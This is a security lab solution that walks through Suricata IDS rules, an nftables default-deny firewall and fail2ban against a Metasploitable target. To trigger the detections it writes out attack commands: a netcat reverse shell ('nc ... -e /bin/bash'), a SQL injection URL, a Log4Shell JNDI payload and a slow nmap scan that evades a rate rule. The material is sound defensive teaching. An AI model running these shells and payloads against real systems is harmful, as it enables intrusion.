# Lab Solution: Firewalls, Suricata IDS & fail2ban

Environment: Kali (attacker + sensor) ↔ Metasploitable 2 (target), host-only/NAT network
Deliverables: 5 working Suricata rules (4 detections + 1 evasion-correlation rule), an nftables default-deny policy with logging, and a fail2ban jail that auto-bans a brute-forcer.

## Setup & Variables
bash
ip -br a
eth0  UP  192.168.56.10/24

export KALI=192.168.56.10
export TARGET=192.168.56.101     # confirm on Metasploitable: ip addr
ping -c1 $TARGET                 # sanity check before anything else

sudo apt update && sudo apt install -y suricata fail2ban
suricata --build-info | head -5  # confirm version + that it's built
Keep $KALI / $TARGET exported in every terminal you use, or re-export them. The rules themselves use any any so they fire regardless of direction — that is intentional for the lab.

Cleanup / reset points used in this write-up

Action	Command
Flush firewall	sudo nft flush ruleset
Stop Suricata	Ctrl-C in its terminal
Unban an IP	sudo fail2ban-client set sshd unbanip $TARGET

## Part 1 — Stand Up Suricata
1.1 Rules file
bash
nano ~/lab.rules
text
alert icmp any any -> any any (msg:"LAB icmp ping seen"; itype:8; sid:1000000; rev:1;)
itype:8 = ICMP echo request, so you alert on the ping going out, not the reply.

1.2 Start the sensor
bash
sudo suricata -i eth0 -S ~/lab.rules -l /var/log/suricata/ -v
-i eth0 — sniff that interface

-S ~/lab.rules — load only this file (no ruleset noise → the class sees exactly their own rules)

-l — log directory

-v — verbose, so you can see it started and loaded 1 rule

Watch alerts in a second terminal:

bash
sudo tail -f /var/log/suricata/fast.log
1.3 Trigger it
bash
ping -c3 $TARGET
Expected in fast.log within ~1 second:

text
09/12/2025-10:14:02.441913  [**] [1:1000000:1] LAB icmp ping seen [**] [Classification: (null)] [Priority: 3] {ICMP} 192.168.56.10 -> 192.168.56.101
Structured (SIEM-style) view:

bash
sudo tail -f /var/log/suricata/eve.json | grep '"event_type":"alert"'
json
{"timestamp":"2025-09-12T10:14:02.441913+0000","event_type":"alert",
 "src_ip":"192.168.56.10","dest_ip":"192.168.56.101","proto":"ICMP",
 "alert":{"action":"allowed","gid":1,"signature_id":1000000,
          "rev":1,"signature":"LAB icmp ping seen","category":"","severity":3}}
Rule reload: edit ~/lab.rules → Ctrl-C Suricata → re-run the same command. (Live reload via kill -USR2 exists but a clean restart is the class-simple path.)

✅ Checkpoint 1: ICMP alert scrolling in fast.log; matching event_type":"alert" line in eve.json.

## Part 2 — Four Real-Attack Rules
Final ~/lab.rules after Part 2:

text
alert icmp any any -> any any (msg:"LAB icmp ping seen"; itype:8; sid:1000000; rev:1;)

alert tcp any any -> any any (msg:"LAB nmap SYN scan"; flags:S; flow:stateless; threshold:type both, track by_src, count 20, seconds 5; classtype:attempted-recon; sid:1000001; rev:1;)

alert http any any -> any any (msg:"LAB SQLi attempt (1=1)"; flow:to_server,established; http.uri; content:"1=1"; nocase; classtype:web-application-attack; sid:1000002; rev:1;)

alert http any any -> any any (msg:"LAB Log4Shell JNDI in User-Agent"; flow:to_server,established; http.user_agent; content:"${jndi:"; nocase; classtype:web-application-attack; sid:1000003; rev:1;)

alert tcp any any -> any 4444 (msg:"LAB reverse shell callback to 4444"; flags:S; flow:stateless; classtype:trojan-activity; sid:1000004; rev:1;)
Restart Suricata after adding them, then run each attack.

A. nmap SYN scan
bash
sudo nmap -sS -p1-1000 $TARGET
Expected:

text
[**] [1:1000001:1] LAB nmap SYN scan [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 192.168.56.10:54321 -> 192.168.56.101:80
Why it works: 1000 SYNs in well under 5 s ≫ count 20, seconds 5. track by_src buckets by source IP; threshold:type both alerts on the threshold and every count after it (rather than limit, which alerts only once).

B. SQL injection
bash
curl "http://$TARGET/?id=1' or 1=1-- -"
Expected:

text
[**] [1:1000002:1] LAB SQLi attempt (1=1) [**] {TCP} 192.168.56.10:41234 -> 192.168.56.101:80
Alerts on the attempt, even if Metasploitable returns 404 — the sensor reads the request, not the response.

C. Log4Shell in User-Agent
bash
curl -A '${jndi:ldap://127.0.0.1:1389/a}' http://$TARGET/
Single quotes are essential — double quotes let bash expand ${jndi:...}.

Expected:

text
[**] [1:1000003:1] LAB Log4Shell JNDI in User-Agent [**] {TCP} 192.168.56.10:41235 -> 192.168.56.101:80
Discussion answer: real payloads obfuscate as ${${lower:j}ndi: / ${::-j}ndi: etc. A literal content:"${jndi:" match misses those. That is the signature limit — which is why Emerging Threats ships dozens of Log4Shell variants plus anomaly/PCRE rules, and why WAF/behavioural layers exist.

D. Reverse-shell callback
Terminal 1 (Kali, listener):

bash
nc -lvnp 4444
Terminal 2 (on Metasploitable):

bash
nc $KALI 4444 -e /bin/bash
Expected on Kali:

text
[**] [1:1000004:1] LAB reverse shell callback to 4444 [**] [Classification: A Network Trojan was Detected] {TCP} 192.168.56.101:44567 -> 192.168.56.10:4444
Type id in the listener to prove the shell works, then exit on both sides.

Discussion answer: real callbacks use 443/8080/53 to blend with egress. A port rule is weak; you'd need content ("/bin/bash" over the wire, TLS JA3/JA4 fingerprint mismatch), beacon-interval anomaly scoring, or egress allow-listing. This is exactly why DLP/NDR exists beyond port signatures.

✅ Checkpoint 2: all four sids (1000001–1000004) present in fast.log.

## Part 3 — Evasion, Then Re-Catch
3.1 Beat the rate rule
bash
sudo nmap -sS -p1-100 --max-rate 2 --scan-delay 1s $TARGET
That's ~2 packets/second — 100 ports over ~50 s, never 20 in 5 s.
Result: fast.log shows no new LAB nmap SYN scan. Two nmap flags defeated the detection.

3.2 Re-catch it with a wider correlation window
Add to ~/lab.rules:

text
alert tcp any any -> any any (msg:"LAB slow SYN scan"; flags:S; flow:stateless; threshold:type both, track by_src, count 15, seconds 120; classtype:attempted-recon; sid:1000011; rev:1;)
Restart Suricata, re-run the same slow scan:

text
[**] [1:1000011:1] LAB slow SYN scan [**] [Classification: Attempted Information Leak] [Priority: 2] {TCP} 192.168.56.10:54399 -> 192.168.56.101:23
3.3 The trade-off (the actual lesson)
Rule	Window	Catches slow scan?	False positives
sid:1000001	20 SYN / 5 s	❌ (false negative)	Low
sid:1000011	15 SYN / 120 s	✅	Higher — a legit client opening >15 connections in 2 min trips it
You bought the detection with false positives. Answer to "how low can count go before normal traffic trips it?" — measure it: a browser loading one page opens 6–30 connections; an apt/pip install or a legit monitoring check easily exceeds 15 per 2 min per source. In this lab, ~15/120 s is already at the edge for a single busy host; below that you'll be alerting on ordinary users.

Takeaway: pure rate thresholds lose the race — the attacker just adds --max-rate. Production sensors combine stateful correlation, multi-signal anomaly scoring, and curated rulesets (ET Open/Pro) rather than a single seconds value. The lab intentionally demonstrates that widening a window is not "free."

✅ Checkpoint 3: the identical slow scan produced no alert before, and does now — and you can state the FP cost.

## Part 4 — Host Firewall with nftables (default deny + logging)
Order matters: do this after Part 2D, or the nftables drop on Kali will block the inbound reverse-shell callback to 4444 and the fail2ban SSH test path. If you must run it first, add tcp dport 4444 accept temporarily.

4.1 Build the ruleset
bash
sudo nft flush ruleset
sudo nft add table inet filter
sudo nft add chain inet filter input '{ type filter hook input priority 0 ; policy drop ; }'
sudo nft add rule inet filter input iifname lo accept
sudo nft add rule inet filter input ct state established,related accept
sudo nft add rule inet filter input tcp dport 22 accept
sudo nft add rule inet filter input log prefix "nft-drop: " drop
Reading it in order (this is the "order beats content / implicit deny" lesson):

policy drop → anything not explicitly allowed is dropped (implicit deny, made explicit)

loopback allowed (so local services don't break)

return traffic for connections we started is allowed (stateful — keeps the box usable)

SSH in, so you don't lock yourself out

log then drop — the evidence trail, and the rule that catches every probe

4.2 Verify
bash
sudo nft list ruleset
Expected:

text
table inet filter {
	chain input {
		type filter hook input priority filter; policy drop;
		iifname "lo" accept
		ct state established,related accept
		tcp dport 22 accept
		log prefix "nft-drop: " drop
	}
}
4.3 Test from Metasploitable
bash
nmap -Pn -p 22,80,443 $KALI
text
PORT    STATE    SERVICE
22/tcp  open     ssh
80/tcp  filtered http
443/tcp filtered https
Only 22 reaches the host; 80/443 are dropped → nmap reports filtered. SSH in from Metasploitable still works → the allow rule is proven.

4.4 Watch the drops
bash
sudo journalctl -k -f | grep 'nft-drop'
Re-run the nmap and the kernel log prints one line per probe:

text
kernel: nft-drop: IN=eth0 OUT= MAC=... SRC=192.168.56.101 DST=192.168.56.10 LEN=60 ... DPT=80
That's the implicit deny, visible and auditable.

4.5 Undo
bash
sudo nft flush ruleset
iptables equivalent (older syntax, same policy):

bash
sudo iptables -P INPUT DROP
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -j LOG --log-prefix "ipt-drop: "
# undo:
sudo iptables -F; sudo iptables -P INPUT ACCEPT
✅ Checkpoint 4: from Metasploitable only 22 is reachable, SSH still works, and journalctl logs each dropped probe with nft-drop:.

## Part 5 — fail2ban: auto-ban the brute-forcer
5.1 Ensure SSH is up on Kali
bash
sudo systemctl start ssh
sudo systemctl enable ssh   # optional
ss -ltnp | grep :22
5.2 Jail config
bash
sudo tee /etc/fail2ban/jail.local >/dev/null <<'EOF'
[sshd]
enabled  = true
maxretry = 3
findtime = 300
bantime  = 600
EOF
3 failures within 5 minutes → 10-minute ban.

bash
sudo systemctl restart fail2ban
sudo fail2ban-client status sshd
text
Status for the jail: sshd
|- Filter
|  |- Currently failed: 0
|  |- Total failed:     0
|  `- File list:        /var/log/auth.log
`- Actions
   |- Currently banned: 0
   |- Total banned:     0
   `- Banned IP list:
5.3 Brute-force from Metasploitable
bash
ssh wronguser@$KALI
# bad password ×3–4
5.4 Watch the ban land
On Kali:

bash
sudo fail2ban-client status sshd
text
   |- Currently banned: 1
   `- Banned IP list:   192.168.56.101
Confirm the firewall rule fail2ban inserted for you:

bash
sudo nft list ruleset | grep -i f2b
# or, on iptables-based banaction:
sudo iptables -L -n | grep -i f2b
Further SSH attempts from Metasploitable now time out / are refused. Note journalctl -u fail2ban shows the Ban 192.168.56.101 event — detection and response joined up in one pipeline.

5.5 Reset
bash
sudo fail2ban-client set sshd unbanip $TARGET
sudo fail2ban-client status sshd      # Banned IP list now empty

checkpoint 5: after a few bad logins, fail2ban-client status sshd lists Metasploitable as banned and that host can no longer reach SSH until expiry or unban.

